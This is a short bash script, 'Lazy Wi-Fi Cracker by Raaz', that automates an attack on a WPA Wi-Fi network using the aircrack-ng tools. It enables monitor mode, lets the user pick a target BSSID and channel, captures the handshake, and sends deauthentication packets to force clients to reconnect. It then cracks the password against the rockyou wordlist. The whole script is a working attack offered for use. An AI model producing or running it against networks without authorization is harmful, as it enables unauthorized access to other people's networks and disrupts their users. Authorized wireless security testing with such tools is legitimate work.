#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

echo -e "${GREEN}=========================================="
echo -e "   Lazy Wi-Fi Cracker by Raaz"
echo -e "==========================================${NC}"

# Step 1: Enable Monitor Mode
echo -e "${GREEN}[+] Enabling Monitor Mode...${NC}"
airmon-ng start wlan0

# Step 2: Scan for Wi-Fi Networks
echo -e "${GREEN}[+] Scanning for Wi-Fi networks...${NC}"
xterm -hold -e "airodump-ng wlan0mon" &

read -p "Enter Target BSSID: " bssid
read -p "Enter Channel: " channel

# Step 3: Capture Handshake
mkdir -p ~/wificap
echo -e "${GREEN}[+] Capturing handshake on channel $channel...${NC}"
xterm -hold -e "airodump-ng --bssid $bssid -c $channel -w ~/wificap/capture wlan0mon" &

sleep 5

# Step 4: Send Deauth Packets
echo -e "${GREEN}[+] Sending deauth packets to force reauthentication...${NC}"
aireplay-ng --deauth 10 -a $bssid wlan0mon

# Step 5: Crack the Captured Handshake
echo -e "${GREEN}[+] Trying to crack password using rockyou.txt...${NC}"
aircrack-ng ~/wificap/capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Step 6: Stop Monitor Mode
echo -e "${GREEN}[+] Stopping Monitor Mode...${NC}"
airmon-ng stop wlan0mon

echo -e "${GREEN}[+] Done. Thank you for using LazyWiFi.${NC}"
mv ~/lazywifi.sh Raaz-wifi/
